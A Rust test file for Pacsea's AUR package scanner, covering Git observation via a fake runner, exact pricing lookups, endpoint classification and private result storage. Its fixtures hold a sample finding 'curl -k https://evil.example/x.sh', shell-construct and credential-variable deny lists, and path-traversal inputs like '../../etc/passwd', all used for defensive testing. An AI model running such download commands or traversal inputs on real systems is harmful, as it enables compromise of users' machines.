//! Deterministic WS7 coverage for native observation, exact pricing, and result storage.
//!
//! Every Git interaction goes through an injected fake runner, so no test here spawns a
//! process, contacts the network, or reaches a real AUR repository. Pricing consumes supplied
//! catalog bytes only, and result storage writes into a per-test private temporary directory.

use std::collections::VecDeque;
use std::ffi::{OsStr, OsString};
use std::path::PathBuf;
use std::time::Duration;

use pacsea::logic::pi_scan::baseline::CommitBuildRelevance;
use pacsea::logic::pi_scan::identity::{AurRepoUrl, CommitOid, PackageBase};
use pacsea::logic::pi_scan::manifest::{CanonicalManifest, ManifestEntry};
use pacsea::logic::pi_scan::observer::{
    DEFAULT_HEAD_QUERY_TIMEOUT, FrozenTargetIdentity, GitCommandRunner, GitInvocation, GitOutput,
    MAX_COMMIT_EXPANSION_PER_CYCLE, MAX_COMMIT_EXPANSION_PER_PACKAGE, ObservationCycle,
    ObserverError, deduplicate_observation_targets, head_query_invocation, observe_package_base,
    parse_head_oid, parse_unseen_commits, verify_lineage_preserved,
};
use pacsea::logic::pi_scan::pricing::{
    EndpointClass, PricingAccounting, PricingCatalog, PricingError, PricingSource,
    classify_endpoint, classify_freshness, conservative_tokens, parse_litellm_catalog,
    parse_openrouter_catalog, pricing_from_pi_model_cost, reserve_worst_case_microusd,
};
use pacsea::logic::pi_scan::result::{
    Coverage, ExpectedIdentity, MergedFinding, MergedScanResult, ModelAttemptRecord,
    ScanProvenance, Severity, UsageAccounting,
};
use pacsea::logic::pi_scan::result_store::{
    DEFAULT_RETENTION_DAYS, RESULT_SCHEMA_VERSION, ResultStoreError, StoredResultSummary,
    StoredScanResult, cleanup_expired_results, find_forbidden_raw_field, load_result,
    plan_retention, result_path, save_result_atomic,
};

/// Fake Git seam that records every invocation and replays scripted output.
struct FakeGit {
    /// Scripted outputs in the exact order they are consumed.
    scripted: VecDeque<GitOutput>,
    /// Every invocation the observer built, in order.
    seen: Vec<GitInvocation>,
}

impl FakeGit {
    /// Build a fake with a complete output script.
    fn new(scripted: Vec<GitOutput>) -> Self {
        Self {
            scripted: scripted.into(),
            seen: Vec::new(),
        }
    }

    /// Return the recorded argv of one invocation as lossy UTF-8.
    fn argv(&self, index: usize) -> Vec<String> {
        self.seen[index].argv_strings()
    }

    /// Return the ordered subcommand of every recorded invocation.
    fn subcommands(&self) -> Vec<String> {
        self.seen
            .iter()
            .map(|invocation| {
                let argv = invocation.argv_strings();
                argv.iter()
                    .skip_while(|arg| arg.as_str() == "-c" || arg.contains('='))
                    .find(|arg| !arg.starts_with('-') && !arg.contains('/'))
                    .cloned()
                    .unwrap_or_default()
            })
            .collect()
    }
}

impl GitCommandRunner for FakeGit {
    fn run(&mut self, invocation: &GitInvocation) -> Result<GitOutput, ObserverError> {
        self.seen.push(invocation.clone());
        self.scripted
            .pop_front()
            .ok_or_else(|| ObserverError::GitCommand {
                operation: "fake".to_string(),
                reason: "the test script ran out of responses".to_string(),
            })
    }
}

/// Build a successful Git output from stdout text.
fn ok(stdout: &str) -> GitOutput {
    GitOutput {
        success: true,
        stdout: stdout.as_bytes().to_vec(),
        stderr: String::new(),
    }
}

/// Build a failed Git output with a stderr reason.
fn failed(stderr: &str) -> GitOutput {
    GitOutput {
        success: false,
        stdout: Vec::new(),
        stderr: stderr.to_string(),
    }
}

/// Build a deterministic full commit OID from a small index.
fn oid(index: u64) -> String {
    format!("{index:040x}")
}

/// Return a validated package base for tests.
fn base(name: &str) -> PackageBase {
    PackageBase::new(name).expect("valid package base")
}

/// Return the fixed executable and mirror directory used by observation tests.
fn git_paths() -> (OsString, OsString) {
    (
        OsString::from("/usr/bin/git"),
        OsString::from("/run/pacsea/mirror"),
    )
}

#[test]
fn head_query_argv_is_direct_isolated_and_quote_free() {
    let package = base("yay");
    let url = AurRepoUrl::for_package_base(&package);
    let invocation =
        head_query_invocation(OsStr::new("/usr/bin/git"), &url, DEFAULT_HEAD_QUERY_TIMEOUT);
    let argv = invocation.argv_strings();

    // The isolation prefix must come first and cannot be displaced by a later argument.
    assert_eq!(argv[0], "-c");
    let isolation: Vec<&String> = argv.iter().take_while(|arg| *arg != "ls-remote").collect();
    for required in [
        "core.hooksPath=/dev/null",
        "credential.helper=",
        "diff.textconv=",
        "submodule.recurse=false",
        "fetch.recurseSubmodules=no",
        "http.proxy=",
        "protocol.allow=never",
    ] {
        assert!(
            isolation.iter().any(|arg| arg.as_str() == required),
            "isolation override {required} must precede the subcommand"
        );
    }

    // Direct argv only: no shell, no helper, no quoting, no interpolated command string.
    assert!(argv.contains(&"ls-remote".to_string()));
    assert!(argv.contains(&"https://aur.archlinux.org/yay.git".to_string()));
    for forbidden in ["sh", "bash", "-c ", "'", "\"", "&&", "|", ";"] {
        assert!(
            !argv
                .iter()
                .any(|arg| arg.contains(forbidden) && arg != "-c"),
            "argv must never contain shell construct {forbidden}: {argv:?}"
        );
    }

    // The environment policy is a positive allowlist with no credential surface.
    assert!(
        !invocation
            .passthrough_environment
            .iter()
            .any(|name| name.contains("PROXY")
                || name.contains("SSH")
                || name.contains("GIT_ASKPASS")
                || name.contains("TOKEN")),
        "no credential or proxy variable may be inherited"
    );
    for (name, value) in [
        ("GIT_TERMINAL_PROMPT", "0"),
        ("GIT_CONFIG_NOSYSTEM", "1"),
        ("GIT_ASKPASS", ""),
    ] {
        assert!(
            invocation
                .fixed_environment
                .iter()
                .any(|(key, val)| key == name && val == value),
            "{name} must be forced to {value:?}"
        );
    }
    assert_eq!(invocation.timeout, DEFAULT_HEAD_QUERY_TIMEOUT);
}

#[test]
fn observation_issues_sequential_queries_in_the_exact_order() {
    let (exe, dir) = git_paths();
    let head = oid(3);
    let mut runner = FakeGit::new(vec![
        ok(&format!("{head}\tHEAD\n")),
        ok(""),
        ok(&format!("{}\n{}\n", oid(2), head)),
        ok("PKGBUILD\n"),
        ok("README.md\n"),
    ]);
    let mut cycle = ObservationCycle::default();
    let previous = CommitOid::new(oid(1)).expect("valid oid");

    let observation = observe_package_base(
        &mut runner,
        &exe,
        &dir,
        &base("yay"),
        Some(&previous),
        &mut cycle,
    )
    .expect("observation succeeds");

    assert_eq!(
        runner.subcommands(),
        vec![
            "ls-remote".to_string(),
            "merge-base".to_string(),
            "rev-list".to_string(),
            "show".to_string(),
            "show".to_string(),
        ],
        "head, ancestry, expansion, then one classification per commit"
    );

    // Expansion is strictly oldest-first with no coalescing.
    assert_eq!(observation.commits.len(), 2);
    assert_eq!(observation.commits[0].oid.as_str(), oid(2));
    assert_eq!(observation.commits[1].oid.as_str(), head);
    assert_eq!(
        observation.commits[0].relevance,
        CommitBuildRelevance::BuildRelevant
    );
    assert!(observation.commits[0].requires_scan());
    assert_eq!(
        observation.commits[1].relevance,
        CommitBuildRelevance::ObservedNoRecipeDelta
    );
    assert!(!observation.commits[1].requires_scan());
    assert!(!observation.paused_for_rebaseline);

    // The rev-list argv must request reverse topological order and the per-package cap.
    let rev_list = runner.argv(2);
    assert!(rev_list.contains(&"--reverse".to_string()));
    assert!(rev_list.contains(&"--topo-order".to_string()));
    assert!(rev_list.contains(&format!("--max-count={MAX_COMMIT_EXPANSION_PER_PACKAGE}")));
    assert!(rev_list.contains(&format!("{}..{head}", oid(1))));
}

#[test]
fn force_pushed_history_preserves_lineage_and_pauses_for_rebaseline() {
    let (exe, dir) = git_paths();
    let head = oid(9);
    // The ancestry check fails, which is exactly the force-push/rewrite signal.
    let mut runner = FakeGit::new(vec![
        ok(&format!("{head}\tHEAD\n")),
        failed("not an ancestor"),
    ]);
    let mut cycle = ObservationCycle::default();
    let previous = CommitOid::new(oid(1)).expect("valid oid");

    let observation = observe_package_base(
        &mut runner,
        &exe,
        &dir,
        &base("yay"),
        Some(&previous),
        &mut cycle,
    )
    .expect("divergence is reported, not fatal");

    assert!(observation.paused_for_rebaseline);
    assert!(
        observation.commits.is_empty(),
        "no commit may be queued while the package awaits explicit rebaseline"
    );
    assert_eq!(
        runner.subcommands(),
        vec!["ls-remote".to_string(), "merge-base".to_string()],
        "expansion must not run after divergence is detected"
    );
    assert_eq!(
        cycle.remaining_budget(),
        MAX_COMMIT_EXPANSION_PER_CYCLE,
        "a paused package must not consume cycle budget"
    );

    // The standalone lineage check produces an actionable divergence error.
    let observed = CommitOid::new(&head).expect("valid oid");
    let error = verify_lineage_preserved(
        &base("yay"),
        Some(&previous),
        &observed,
        Some(&failed("not an ancestor")),
    )
    .expect_err("divergence must be reported");
    assert!(matches!(error, ObserverError::HistoryDiverged { .. }));
    let message = error.to_string();
    assert!(message.contains("rewritten"));
    assert!(message.contains("rebaseline"));
}

#[test]
fn expansion_is_capped_per_package_and_per_cycle() {
    // The per-package cap binds when the cycle budget is larger.
    let mut lines = String::new();
    for index in 0..MAX_COMMIT_EXPANSION_PER_PACKAGE + 25 {
        use std::fmt::Write as _;
        let _ = writeln!(lines, "{}", oid(index as u64));
    }
    let per_package =
        parse_unseen_commits(&ok(&lines), MAX_COMMIT_EXPANSION_PER_CYCLE).expect("bounded");
    assert_eq!(per_package.commits.len(), MAX_COMMIT_EXPANSION_PER_PACKAGE);
    assert!(
        per_package.truncated,
        "truncation must be reported, not silent"
    );

    // The remaining cycle budget binds when it is smaller than the per-package cap.
    let per_cycle = parse_unseen_commits(&ok(&lines), 7).expect("bounded");
    assert_eq!(per_cycle.commits.len(), 7);
    assert!(per_cycle.truncated);

    // Cycle budget is shared across packages so the 2,000 cap holds globally.
    let (exe, dir) = git_paths();
    let head = oid(2);
    let mut runner = FakeGit::new(vec![
        ok(&format!("{head}\tHEAD\n")),
        ok(&format!("{}\n{head}\n", oid(1))),
        ok("PKGBUILD\n"),
        ok("PKGBUILD\n"),
    ]);
    let mut cycle = ObservationCycle::default();
    observe_package_base(&mut runner, &exe, &dir, &base("yay"), None, &mut cycle)
        .expect("observation succeeds");
    assert_eq!(cycle.remaining_budget(), MAX_COMMIT_EXPANSION_PER_CYCLE - 2);
}

#[test]
fn observed_oids_are_fully_validated_and_failures_are_actionable() {
    // Abbreviated, symbolic, and non-hex answers are all rejected.
    for bad in ["abc123\tHEAD\n", "ref: refs/heads/master\n", "\n"] {
        assert!(
            parse_head_oid(&ok(bad)).is_err(),
            "{bad:?} must not produce a commit identity"
        );
    }
    let good = oid(7);
    assert_eq!(
        parse_head_oid(&ok(&format!("{good}\tHEAD\n")))
            .expect("valid head")
            .as_str(),
        good
    );

    // A failed invocation names the operation and the user's next step.
    let error = parse_head_oid(&failed("could not resolve host")).expect_err("must fail");
    let message = error.to_string();
    assert!(message.contains("could not resolve host"));
    assert!(message.contains("aur.archlinux.org"));

    // An invalid OID inside an expansion is rejected rather than partially accepted.
    assert!(parse_unseen_commits(&ok("zzzz\n"), 10).is_err());
}

#[test]
fn frozen_identity_never_infers_provenance_from_version_equality() {
    let frozen = FrozenTargetIdentity {
        package_base: base("yay"),
        installed_names: vec!["yay".to_string(), "yay-debug".to_string()],
        installed_version: "12.5.0-1".to_string(),
        candidate_version: Some("12.5.0-1".to_string()),
        observed_head_oid: CommitOid::new(oid(4)).expect("valid oid"),
        cycle_id: "cycle-1".to_string(),
    };

    // Identical installed and candidate versions still prove nothing about build provenance.
    assert_eq!(frozen.installed_version, *"12.5.0-1");
    assert_eq!(frozen.candidate_version.as_deref(), Some("12.5.0-1"));
    assert!(
        !frozen.provenance_proven(),
        "version equality must never imply proven provenance"
    );

    // Staleness is decided by commit identity only.
    let same = CommitOid::new(oid(4)).expect("valid oid");
    let moved = CommitOid::new(oid(5)).expect("valid oid");
    assert!(!frozen.is_stale_against(&same));
    assert!(frozen.is_stale_against(&moved));
}

#[test]
fn split_package_bases_are_observed_once() {
    let bases = vec![base("yay"), base("yay"), base("paru"), base("yay")];
    let unique = deduplicate_observation_targets(&bases);
    let names: Vec<&str> = unique.iter().map(PackageBase::as_str).collect();
    assert_eq!(names, vec!["yay", "paru"]);
}

#[test]
fn pricing_matches_exactly_and_never_substitutes() {
    let litellm = br#"{
        "claude-sonnet-4": {"litellm_provider":"anthropic","input_cost_per_token":3e-6,"output_cost_per_token":1.5e-5},
        "gpt-5": {"litellm_provider":"openai","input_cost_per_token":1.25e-6,"output_cost_per_token":1e-5},
        "broken": {"litellm_provider":"openai","input_cost_per_token":"not-a-number"}
    }"#;
    let records = parse_litellm_catalog(litellm, &[]).expect("catalog parses");
    // The unusable entry is skipped rather than guessed or defaulted to zero.
    assert_eq!(records.len(), 2);

    let catalog = PricingCatalog::new(records, 1_000);
    let exact = catalog
        .lookup_exact("anthropic", "claude-sonnet-4")
        .expect("exact route");
    assert_eq!(exact.source, PricingSource::LiteLlmCatalog);
    assert_eq!(exact.rates.input_microusd_per_million, 3_000_000);
    assert_eq!(exact.rates.output_microusd_per_million, 15_000_000);

    // Near misses must all fail closed instead of substituting a similar model's price.
    for (provider, model) in [
        ("anthropic", "claude-sonnet-4-5"),
        ("anthropic", "claude-sonnet"),
        ("anthropic", "claude-sonnet-4 "),
        ("Anthropic", "claude-sonnet-4"),
        ("openai", "claude-sonnet-4"),
        ("anthropic", "broken"),
    ] {
        assert!(
            matches!(
                catalog.lookup_exact(provider, model),
                Err(PricingError::RouteNotFound { .. })
            ),
            "{provider}/{model} must not match any other route"
        );
    }

    // A missing route explains that Pacsea never substitutes a price.
    let message = catalog
        .lookup_exact("anthropic", "unknown")
        .expect_err("missing route")
        .to_string();
    assert!(message.contains("never substitutes"));
}

#[test]
fn openrouter_routes_and_pi_model_cost_are_exact_sources() {
    let openrouter = br#"{"data":[
        {"id":"anthropic/claude-sonnet-4","pricing":{"prompt":"0.000003","completion":"0.000015"}},
        {"id":"vendor/no-pricing"}
    ]}"#;
    let records = parse_openrouter_catalog(openrouter, &[]).expect("catalog parses");
    assert_eq!(records.len(), 1, "entries without pricing are skipped");
    let catalog = PricingCatalog::new(records, 0);
    let routed = catalog
        .lookup_exact("openrouter", "anthropic/claude-sonnet-4")
        .expect("exact routed model");
    assert_eq!(routed.source, PricingSource::OpenRouterCatalog);
    assert_eq!(routed.rates.output_microusd_per_million, 15_000_000);

    // Pi Model.cost remains the primary source and overrides a catalog record exactly.
    let cost = serde_json::json!({"input": 2e-6, "output": 8e-6});
    let primary = pricing_from_pi_model_cost("openrouter", "anthropic/claude-sonnet-4", &cost, &[])
        .expect("valid Pi cost");
    assert_eq!(primary.source, PricingSource::PiModelCost);
    let layered = PricingCatalog::new(vec![routed.clone(), primary], 0);
    assert_eq!(
        layered
            .lookup_exact("openrouter", "anthropic/claude-sonnet-4")
            .expect("layered route")
            .source,
        PricingSource::PiModelCost
    );

    // A malformed document is an explicit error, never an empty catalog.
    assert!(parse_openrouter_catalog(b"{}", &[]).is_err());
    assert!(parse_litellm_catalog(b"[]", &[]).is_err());
}

#[test]
fn subscription_routes_are_zero_dollar_but_token_bounded_and_labelled() {
    let subscription = vec![("vendor".to_string(), "included-model".to_string())];
    let cost = serde_json::json!({"input": 3e-6, "output": 1.5e-5});

    let metered = pricing_from_pi_model_cost("vendor", "metered-model", &cost, &subscription)
        .expect("valid cost");
    let backed = pricing_from_pi_model_cost("vendor", "included-model", &cost, &subscription)
        .expect("valid cost");

    assert_eq!(metered.accounting, PricingAccounting::Metered);
    assert_eq!(backed.accounting, PricingAccounting::SubscriptionBacked);
    assert_eq!(
        backed.accounting.label(),
        "Subscription-backed (not free API usage)",
        "subscription usage is never labelled free API usage"
    );

    let usage = UsageAccounting {
        rpc_bytes: 2_000_000,
        reported_tokens: None,
    };
    // Dollar accounting is zero for the subscription route but non-zero for the metered one.
    assert_eq!(reserve_worst_case_microusd(&backed, usage), 0);
    assert!(reserve_worst_case_microusd(&metered, usage) > 0);

    // Tokens remain fully bounded for both, using the approved conservative fallback.
    let expected_tokens = 2_000_000u64.div_ceil(2) + 8_000;
    assert_eq!(conservative_tokens(usage), expected_tokens);

    // Reported usage cannot undercut the conservative RPC-byte floor.
    let reported = UsageAccounting {
        rpc_bytes: 2_000_000,
        reported_tokens: Some(1_234),
    };
    assert_eq!(conservative_tokens(reported), 1_000_000);
}

#[test]
fn custom_endpoints_are_classified_conservatively() {
    for (endpoint, expected) in [
        ("http://127.0.0.1:11434/v1", EndpointClass::Local),
        ("http://[::1]:8080", EndpointClass::Local),
        ("unix:///run/model.sock", EndpointClass::Local),
        ("/run/user/1000/model.sock", EndpointClass::Local),
        ("http://10.0.0.4:8000/v1", EndpointClass::PrivateNetwork),
        ("http://172.16.5.9/v1", EndpointClass::PrivateNetwork),
        ("http://192.168.1.5:1234/v1", EndpointClass::PrivateNetwork),
        ("http://[fd00::1]/v1", EndpointClass::PrivateNetwork),
        ("https://api.vendor.example/v1", EndpointClass::Remote),
        ("https://localhost.vendor.example/v1", EndpointClass::Remote),
        ("http://8.8.8.8/v1", EndpointClass::Remote),
        ("", EndpointClass::Remote),
    ] {
        assert_eq!(
            classify_endpoint(endpoint),
            expected,
            "{endpoint} must classify as {}",
            expected.label()
        );
    }
    assert_eq!(EndpointClass::PrivateNetwork.label(), "Private network");
}

#[test]
fn weekly_freshness_labels_stale_cached_pricing_without_discarding_it() {
    let week = 7 * 24 * 60 * 60;
    let catalog = PricingCatalog::new(
        parse_litellm_catalog(
            br#"{"m":{"litellm_provider":"p","input_cost_per_token":1e-6,"output_cost_per_token":2e-6}}"#,
            &[],
        )
        .expect("catalog parses"),
        1_000,
    );

    assert!(!catalog.freshness(1_000 + week).is_stale());
    let stale = catalog.freshness(1_000 + week + 1);
    assert!(stale.is_stale());
    assert_eq!(stale.label(), "Stale cached pricing");

    // Stale pricing is still usable under the approved policy; only the label changes.
    assert!(catalog.lookup_exact("p", "m").is_ok());

    // Clock skew must not wrap the age computation.
    assert!(!classify_freshness(5_000, 1_000).is_stale());
}

/// Build a validated merged result and provenance for storage tests.
fn merged_fixture(package_base: &str, scan_id: &str) -> (MergedScanResult, ScanProvenance) {
    let merged = MergedScanResult {
        identity: ExpectedIdentity {
            scan_id: scan_id.to_string(),
            package_base: package_base.to_string(),
            commit_oid: oid(11),
        },
        coverage: Coverage::Complete,
        limitations: vec!["one binary asset was manifest-only".to_string()],
        findings: vec![MergedFinding {
            fingerprint: "f".repeat(64),
            severity: Severity::High,
            snapshot: "recipe".to_string(),
            path: "PKGBUILD".to_string(),
            evidence: "curl -k https://evil.example/x.sh".to_string(),
            assessments: Vec::new(),
            disagreement: false,
        }],
    };
    let provenance = ScanProvenance {
        pi_version: "0.84.0".to_string(),
        extension_sha256: "a".repeat(64),
        prompt_version: "pacsea-scan-prompt-1".to_string(),
        schema_version: "pacsea-scan-result-1".to_string(),
        tool_contract_version: "pacsea-scan-tools-1".to_string(),
        attempts: vec![ModelAttemptRecord {
            provider: "vendor".to_string(),
            model: "model".to_string(),
            validated: true,
            corrected: false,
            usage: UsageAccounting {
                rpc_bytes: 4_096,
                reported_tokens: Some(900),
            },
        }],
    };
    (merged, provenance)
}

/// Build a canonical manifest fixture bound to a stored result.
fn manifest_fixture() -> CanonicalManifest {
    CanonicalManifest::new(vec![
        ManifestEntry::new("recipe", "PKGBUILD", 128, "b".repeat(64), false, false)
            .expect("valid entry"),
    ])
}

/// Create a private per-test temporary directory root.
fn temp_root(name: &str) -> PathBuf {
    let unique = format!(
        "pacsea-ws7-{name}-{}-{:?}",
        std::process::id(),
        std::thread::current().id()
    );
    let root = std::env::temp_dir().join(unique);
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&root).expect("temp root");
    root
}

#[test]
fn result_paths_are_confined_and_reject_traversal() {
    let root = PathBuf::from("/tmp/pacsea/pi_scan/results-v1");
    let good = result_path(&root, "yay", "scan-1").expect("safe path");
    assert!(good.starts_with(&root));
    assert!(good.ends_with("yay/scan-1.json"));

    for (package_base, scan_id) in [
        ("..", "scan-1"),
        ("yay", ".."),
        ("yay", "../../etc/passwd"),
        ("yay", "a/b"),
        ("yay", "a\\b"),
        ("yay", "a\0b"),
        ("yay", "a\nb"),
        ("yay", ""),
        ("/etc", "scan-1"),
        ("yay", &"x".repeat(65)),
    ] {
        assert!(
            matches!(
                result_path(&root, package_base, scan_id),
                Err(ResultStoreError::UnsafePath { .. })
            ),
            "{package_base}/{scan_id} must be rejected"
        );
    }
}

#[test]
fn stored_results_are_private_atomic_and_carry_no_raw_fields() {
    let root = temp_root("store");
    let results_root = root.join("pi_scan").join("results-v1");
    let quarantine = root.join("pi_scan").join("quarantine");
    let (merged, provenance) = merged_fixture("yay", "scan-1");

    let document = StoredScanResult::from_validated(
        "scan-1",
        &merged,
        &provenance,
        &[manifest_fixture()],
        1_700_000_000,
        false,
    )
    .expect("canonical document");
    assert_eq!(document.schema_version, RESULT_SCHEMA_VERSION);
    assert_eq!(document.commit_oid, oid(11));
    assert_eq!(document.manifests.len(), 1);
    assert_eq!(
        document.manifests[0].manifest_hash,
        manifest_fixture().calculate_manifest_hash()
    );

    let receipt = save_result_atomic(&results_root, &document).expect("atomic commit");
    assert_eq!(receipt.committed_at_unix(), 1_700_000_000);

    let path = result_path(&results_root, "yay", "scan-1").expect("safe path");
    assert!(path.is_file());
    assert!(
        !results_root.join("yay").join(".tmp-scan-1.json").exists(),
        "the temporary file must not survive the atomic rename"
    );

    // Only validated canonical typed data is persisted.
    let bytes = std::fs::read(&path).expect("stored document");
    assert!(
        find_forbidden_raw_field(&bytes).is_none(),
        "no raw prompt, source, thinking, or response field may be persisted"
    );
    let text = String::from_utf8(bytes).expect("utf-8 document");
    assert!(text.contains("pacsea-scan-prompt-1"), "provenance is kept");
    assert!(!text.contains("\"thinking\""));
    assert!(!text.contains("\"raw\""));

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let file_mode = std::fs::metadata(&path)
            .expect("metadata")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(file_mode, 0o600, "result documents must be owner-only");
        let dir_mode = std::fs::metadata(results_root.join("yay"))
            .expect("metadata")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(dir_mode, 0o700, "result directories must be owner-only");
    }

    // The round trip preserves the exact canonical document.
    let (loaded, load_receipt) =
        load_result(&results_root, &quarantine, "yay", "scan-1", 1_700_000_100)
            .expect("stored result loads");
    assert_eq!(loaded, document);
    assert_eq!(load_receipt.committed_at_unix(), 1_700_000_100);

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn corrupt_and_newer_documents_are_quarantined_never_treated_as_clean() {
    let root = temp_root("quarantine");
    let results_root = root.join("results-v1");
    let quarantine = root.join("quarantine");
    std::fs::create_dir_all(results_root.join("yay")).expect("package dir");

    // A corrupt document is quarantined rather than read as an empty result.
    let corrupt_path = result_path(&results_root, "yay", "corrupt").expect("safe path");
    std::fs::write(&corrupt_path, b"{not json").expect("write corrupt");
    let error = load_result(&results_root, &quarantine, "yay", "corrupt", 42)
        .expect_err("corrupt state must fail");
    let quarantined_to = match &error {
        ResultStoreError::Corrupt { quarantined_to, .. } => quarantined_to.clone(),
        other => panic!("expected a corrupt error, got {other:?}"),
    };
    let quarantined_to = quarantined_to.expect("corrupt artifact is quarantined");
    assert!(PathBuf::from(&quarantined_to).is_file());
    assert!(
        !corrupt_path.exists(),
        "the original must be moved, not copied"
    );
    assert!(error.to_string().contains("not treated as an empty"));

    // An unsupported newer schema version is also quarantined and named exactly.
    let newer_path = result_path(&results_root, "yay", "newer").expect("safe path");
    std::fs::write(
        &newer_path,
        format!(r#"{{"schema_version":{}}}"#, RESULT_SCHEMA_VERSION + 1),
    )
    .expect("write newer");
    let error = load_result(&results_root, &quarantine, "yay", "newer", 43)
        .expect_err("newer state must fail");
    assert!(matches!(
        error,
        ResultStoreError::UnsupportedNewerVersion { observed, max_supported, .. }
            if observed == RESULT_SCHEMA_VERSION + 1 && max_supported == RESULT_SCHEMA_VERSION
    ));

    // A missing document is distinct from a corrupt one.
    assert!(matches!(
        load_result(&results_root, &quarantine, "yay", "absent", 44),
        Err(ResultStoreError::Missing { .. })
    ));

    // Two quarantine artifacts now exist and cleanup must never remove them.
    let quarantined_before: Vec<_> = std::fs::read_dir(&quarantine)
        .expect("quarantine dir")
        .filter_map(Result::ok)
        .collect();
    assert_eq!(quarantined_before.len(), 2);

    let (merged, provenance) = merged_fixture("yay", "keep");
    let document =
        StoredScanResult::from_validated("keep", &merged, &provenance, &[], 1_000, false)
            .expect("canonical document");
    let receipt = save_result_atomic(&results_root, &document).expect("atomic commit");
    let plan = plan_retention(
        &[StoredResultSummary {
            scan_id: "keep".to_string(),
            stored_at_unix: 1_000,
            accepted_baseline: false,
        }],
        1_000,
        DEFAULT_RETENTION_DAYS,
    );
    cleanup_expired_results(&results_root, "yay", &plan, &receipt).expect("cleanup runs");
    let quarantined_after: Vec<_> = std::fs::read_dir(&quarantine)
        .expect("quarantine dir")
        .filter_map(Result::ok)
        .collect();
    assert_eq!(
        quarantined_after.len(),
        2,
        "quarantine artifacts are never deleted automatically"
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn retention_keeps_newest_and_baseline_and_prunes_only_expired_results() {
    let root = temp_root("retention");
    let results_root = root.join("results-v1");
    let day = 24 * 60 * 60u64;
    let now = 200 * day;

    let entries = [
        ("newest", now, false),
        ("baseline", 10 * day, true),
        ("expired", 10 * day, false),
        ("recent", now - (5 * day), false),
    ];
    let mut summaries = Vec::new();
    for (scan_id, stored_at, accepted) in entries {
        let (merged, provenance) = merged_fixture("yay", scan_id);
        let document = StoredScanResult::from_validated(
            scan_id,
            &merged,
            &provenance,
            &[],
            stored_at,
            accepted,
        )
        .expect("canonical document");
        save_result_atomic(&results_root, &document).expect("atomic commit");
        summaries.push(StoredResultSummary {
            scan_id: scan_id.to_string(),
            stored_at_unix: stored_at,
            accepted_baseline: accepted,
        });
    }

    let plan = plan_retention(&summaries, now, DEFAULT_RETENTION_DAYS);
    assert!(plan.keep.contains(&"newest".to_string()));
    assert!(
        plan.keep.contains(&"baseline".to_string()),
        "the accepted baseline is retained even when it is not the newest"
    );
    assert_eq!(
        plan.delete,
        vec!["expired".to_string()],
        "only superseded results past the retention window are deleted"
    );

    // Cleanup requires a receipt, which only a successful load or commit can produce.
    let (_, receipt) = load_result(
        &results_root,
        &root.join("quarantine"),
        "yay",
        "newest",
        now,
    )
    .expect("successful load before cleanup");
    let removed = cleanup_expired_results(&results_root, "yay", &plan, &receipt).expect("cleanup");
    assert_eq!(removed.len(), 1);

    for kept in ["newest", "baseline", "recent"] {
        let path = result_path(&results_root, "yay", kept).expect("safe path");
        assert!(path.is_file(), "{kept} must be retained");
    }
    let expired = result_path(&results_root, "yay", "expired").expect("safe path");
    assert!(!expired.exists(), "the expired result must be removed");

    // Repeating cleanup is idempotent and never fails on an already-removed document.
    assert!(
        cleanup_expired_results(&results_root, "yay", &plan, &receipt)
            .expect("idempotent cleanup")
            .is_empty()
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn observation_head_timeout_is_clamped_to_the_compiled_maximum() {
    // A configured value may lower the deadline but never raise the compiled maximum.
    let raised = ObservationCycle::new(Duration::from_hours(1));
    assert_eq!(raised.head_query_timeout(), DEFAULT_HEAD_QUERY_TIMEOUT);

    let lowered = ObservationCycle::new(Duration::from_secs(5));
    assert_eq!(lowered.head_query_timeout(), Duration::from_secs(5));

    let package = base("yay");
    let url = AurRepoUrl::for_package_base(&package);
    let invocation = head_query_invocation(
        OsStr::new("/usr/bin/git"),
        &url,
        lowered.head_query_timeout(),
    );
    assert_eq!(invocation.timeout, Duration::from_secs(5));
}
